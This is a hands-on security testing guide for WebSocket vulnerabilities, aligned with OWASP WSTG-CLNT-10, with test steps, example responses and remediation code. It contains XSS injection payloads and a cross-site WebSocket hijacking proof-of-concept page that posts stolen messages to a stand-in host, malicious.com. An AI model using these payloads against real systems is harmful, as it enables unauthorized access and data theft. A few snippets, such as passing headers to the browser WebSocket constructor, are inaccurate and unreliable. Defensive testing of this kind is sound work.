# Testing for WebSockets Vulnerabilities

## Overview

Testing for WebSockets vulnerabilities involves verifying that a web application's WebSocket implementation securely handles communication to prevent unauthorized access, data injection, or exploitation. According to OWASP (WSTG-CLNT-10), WebSocket vulnerabilities arise when implementations lack proper authentication, input validation, or origin checks, allowing attackers to inject malicious messages, hijack connections, or steal sensitive data. This guide provides a hands-on methodology to identify and test WebSocket vulnerabilities, focusing on common issues like cross-site WebSocket hijacking (CSWSH), insecure message handling, and origin validation, with tools, commands, and remediation strategies.

**Impact**: WebSocket vulnerabilities can lead to:
- Unauthorized access to real-time data streams (e.g., chat messages, live updates).
- Injection of malicious content or scripts into WebSocket communications.
- Session hijacking or data leakage via cross-origin attacks.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-CLNT-10, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as manipulating WebSocket connections may trigger security alerts or violate terms of service.

## Testing Tools

The following tools are recommended for testing WebSocket vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and manipulates WebSocket messages.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use WebSocket tab to view and modify messages.
  - **Note**: Enable WebSocket interception in Proxy settings.

- **Zed Attack Proxy (ZAP) 3.0**: A proxy tool for intercepting and analyzing WebSocket traffic.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:11000`.
  - Enable WebSocket support:
    1. Go to Tools > Options > WebSockets.
    2. Enable WebSocket message logging.
  - Use WebSocket tab to inspect and manipulate messages.

- **Browser Developer Tools (Chrome/Firefox)**: Monitors WebSocket connections and messages.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab, filter by `WS` (WebSocket), to view connections.
  - Example command to test WebSocket connection:
    ```javascript
    const ws = new WebSocket('ws://example.com/ws');
    ws.onmessage = e => console.log(e.data);
    ws.send('test');
    ```
  - **Tip**: Firefox’s 2025 WebSocket debugging enhancements improve message inspection.

- **cURL and wscat**: Send WebSocket requests to test server responses.
  - **cURL** (for HTTP upgrades to WebSocket):
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **wscat** (WebSocket client):
    - Install:
      ```bash
      npm install -g wscat
      ```
    - Example:
      ```bash
      wscat -c ws://example.com/ws
      > test message
      ```
  - **Note**: wscat is ideal for manual message injection.

- **WebSocket Fuzzer**: A tool for fuzzing WebSocket messages to identify vulnerabilities.
  - Install (example using OWASP ZAP’s fuzzer or custom scripts):
    ```bash
    git clone https://github.com/fuzzdb-project/fuzzdb.git
    ```
  - Usage in ZAP:
    1. Select a WebSocket message in ZAP.
    2. Right-click > Fuzz > Add payloads (e.g., XSS, SQLi).
  - **Note**: Use fuzzdb payloads for injection testing.

- **WebSocket Payloads**: Curated payloads for testing.
  - Sample payloads:
    - `<script>alert('xss')</script>`
    - `{"command":"eval","data":"alert('xss')"}`
    - `null`
  - Resource: [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html).
  - **Tip**: Test payloads in WebSocket messages and monitor responses.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-CLNT-10, testing WebSocket vulnerabilities across origin validation, authentication, message injection, cross-site WebSocket hijacking, and denial-of-service risks.

### 1. Test Origin Validation

**Objective**: Ensure the WebSocket server validates the `Origin` header to prevent unauthorized connections.

**Steps**:
1. Identify WebSocket endpoints:
   - Use Network tab (filter `WS`) to find `ws://` or `wss://` URLs.
2. Send a WebSocket request with a malicious origin:
   ```bash
   wscat -c ws://example.com/ws -H "Origin: http://malicious.com"
   ```
3. Check server response:
   - Connection should be rejected if `Origin` is untrusted.
   - Use Browser Developer Tools to verify:
     ```javascript
     const ws = new WebSocket('ws://example.com/ws', [], { headers: { Origin: 'http://malicious.com' } });
     ws.onerror = e => console.log('Connection failed:', e);
     ```

**Example Secure Response**:
```http
HTTP/1.1 403 Forbidden
```
Connection rejected for `malicious.com`.

**Example Vulnerable Response**:
```http
HTTP/1.1 101 Switching Protocols
```
Connection established for any origin.

**Remediation**:
- Validate `Origin` header:
  ```javascript
  // Node.js WebSocket server
  const allowedOrigins = ['https://example.com'];
  if (allowedOrigins.includes(req.headers.origin)) {
    ws.accept();
  } else {
    ws.reject();
  }
  ```
- Use secure protocols (`wss://`):
  ```javascript
  const wsServer = new WebSocketServer({ secure: true });
  ```

**Tip**: Save WebSocket connection logs and response headers in a report.

### 2. Test Authentication and Authorization

**Objective**: Ensure WebSocket connections require proper authentication.

**Steps**:
1. Attempt an unauthenticated connection:
   ```bash
   wscat -c ws://example.com/ws
   ```
2. Check if the server allows access without credentials.
3. Test with invalid credentials:
   - Modify cookies or tokens in Burp Suite and attempt connection.
   - Example:
     ```bash
     wscat -c ws://example.com/ws -H "Cookie: session=invalid"
     ```
4. Verify sensitive data access:
   - Send messages and check for unauthorized data in responses.

**Example Secure Response**:
```http
HTTP/1.1 401 Unauthorized
```
Connection rejected without valid credentials.

**Example Vulnerable Response**:
```http
HTTP/1.1 101 Switching Protocols
```
Connection established without authentication.

**Remediation**:
- Require authentication:
  ```javascript
  if (!verifyToken(req.headers.cookie)) {
    ws.reject(401);
  }
  ```
- Use secure session management:
  ```javascript
  ws.on('connection', (ws, req) => {
    if (!req.session.user) ws.close();
  });
  ```

**Tip**: Log authentication attempts and response data in a report.

### 3. Test Message Injection

**Objective**: Ensure WebSocket messages are validated to prevent malicious content.

**Steps**:
1. Establish a WebSocket connection:
   ```bash
   wscat -c ws://example.com/ws
   ```
2. Inject malicious payloads:
   - Example:
     ```bash
     > <script>alert('xss')</script>
     > {"command":"eval","data":"alert('xss')"}
     ```
3. Check for execution or propagation:
   - Monitor other clients (e.g., another browser) for reflected payloads.
   - Use Browser Developer Tools:
     ```javascript
     ws.onmessage = e => console.log('Received:', e.data);
     ```

**Example Secure Response**:
```json
{
  "error": "Invalid input"
}
```
Payload sanitized or rejected.

**Example Vulnerable Response**:
```html
<script>alert('xss')</script>
```
Payload executed or reflected.

**Remediation**:
- Sanitize messages:
  ```javascript
  const safeMessage = message.replace(/[<>]/g, '');
  ws.send(safeMessage);
  ```
- Validate message structure:
  ```javascript
  if (!isValidJSON(message) || !allowedCommands.includes(message.command)) {
    ws.send('Invalid message');
  }
  ```

**Tip**: Save injected payloads and client-side effects in a report.

### 4. Test Cross-Site WebSocket Hijacking (CSWSH)

**Objective**: Ensure WebSocket connections are not vulnerable to cross-origin hijacking.

**Steps**:
1. Create a malicious HTML page:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
     <script>
       const ws = new WebSocket('ws://example.com/ws');
       ws.onmessage = e => {
         fetch('http://malicious.com/steal', { method: 'POST', body: e.data });
       };
       ws.send('test');
     </script>
   </body>
   </html>
   ```
2. Host the page on a controlled server (e.g., `python3 -m http.server 8000`).
3. Load the page in a browser and monitor for stolen data:
   - Check `malicious.com` server logs for intercepted messages.
4. Test with credentials:
   - Include cookies in the WebSocket request and verify data leakage.

**Example Secure Response**:
```http
HTTP/1.1 403 Forbidden
```
Connection rejected due to origin or authentication checks.

**Example Vulnerable Response**:
```http
HTTP/1.1 101 Switching Protocols
```
Data sent to `malicious.com`.

**Remediation**:
- Enforce origin checks:
  ```javascript
  if (req.headers.origin !== 'https://example.com') {
    ws.reject();
  }
  ```
- Require CSRF tokens:
  ```javascript
  if (!req.headers['x-csrf-token']) {
    ws.close();
  }
  ```

**Tip**: Save CSWSH PoC code and stolen data logs in a report.

### 5. Test Denial-of-Service (DoS) Risks

**Objective**: Ensure WebSocket servers handle excessive or malformed messages gracefully.

**Steps**:
1. Send rapid or large messages:
   ```bash
   wscat -c ws://example.com/ws
   > {"data":"A".repeat(1000000)}
   ```
2. Test malformed messages:
   ```bash
   > {"invalid": null, "data": [}
   ```
3. Monitor server behavior:
   - Check for crashes, slowdowns, or connection drops.
   - Use Burp Suite to replay messages at high frequency.

**Example Secure Response**:
```json
{
  "error": "Message too large"
}
```
Server limits or rejects invalid messages.

**Example Vulnerable Response**:
```http
WebSocket connection closed unexpectedly
```
Server crashes or becomes unresponsive.

**Remediation**:
- Limit message size:
  ```javascript
  ws.on('message', data => {
    if (data.length > 10000) ws.close();
  });
  ```
- Validate message format:
  ```javascript
  try {
    JSON.parse(data);
  } catch (e) {
    ws.send('Invalid JSON');
  }
  ```

**Tip**: Document DoS payloads and server behavior in a report.